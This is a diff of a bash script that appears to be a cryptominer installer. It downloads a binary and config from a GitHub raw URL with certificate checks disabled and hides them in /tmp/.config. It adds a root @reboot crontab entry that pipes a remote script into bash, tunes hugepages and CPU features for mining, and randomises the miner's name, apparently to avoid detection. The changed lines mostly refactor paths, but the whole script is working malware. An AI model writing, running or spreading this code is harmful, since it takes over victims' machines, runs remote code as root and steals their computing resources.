@@ -1,6 +1,7 @@
 #!/bin/bash
 
 mode="${1:-0}"
+work="/tmp/.config"
 src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
 
 RandString() {
@@ -33,22 +34,21 @@ sudo sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1 || sysctl -w vm.n
 sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
 
 
-rm -rf "/tmp/.config"
-mkdir -p "/tmp/.config"
-wget --no-check-certificate -4 -qO "/tmp/.config/appsettings.json" "${src}/q.json"
-wget --no-check-certificate -4 -qO "/tmp/.config/bash" "${src}/q"
-chmod -R 777 "/tmp/.config"
-sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "/tmp/.config/appsettings.json"
+rm -rf "${work}"; mkdir -p "${work}"
+wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
+wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q"
+chmod -R 777 "${work}"
+sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "${work}/appsettings.json"
 
 
 cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX512'
 [ "$?" == "0" ] && AVX512=1 || AVX512=0
 cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX2'
 [ "$?" == "0" ] && [ "$AVX512" == "0" ] && AVX2=1 || AVX2=0
-[ "$AVX2" == "1" ] && sed -i "s/AVX512/AVX2/g" "/tmp/.config/appsettings.json"
-[ "$AVX512" == "0" ] && [ "$AVX2" == "0" ] && sed -i "/AVX512/d" "/tmp/.config/appsettings.json"
+[ "$AVX2" == "1" ] && sed -i "s/AVX512/AVX2/g" "${work}/appsettings.json"
+[ "$AVX512" == "0" ] && [ "$AVX2" == "0" ] && sed -i "/AVX512/d" "${work}/appsettings.json"
 
-echo "#Mode: m${mode}_c${cores}_${addr}"
+echo "##mode: m${mode}_c${cores}_${addr}"
 
 if [ "$mode" == "0" ]; then
   name=`RandString 2 c${cores}_${addr}`;
